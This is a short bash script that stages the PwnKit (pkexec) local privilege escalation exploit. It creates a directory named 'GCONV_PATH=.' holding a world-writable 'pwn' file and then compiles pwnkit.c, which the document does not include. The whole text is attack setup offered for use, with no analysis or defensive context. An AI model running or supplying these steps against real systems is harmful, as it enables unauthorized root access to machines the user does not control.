#!/bin/bash
mkdir 'GCONV_PATH=.'
touch GCONV_PATH\=./pwn
cd GCONV_PATH\=./
ls
chmod 777 *
cd
gcc pwnkit.c
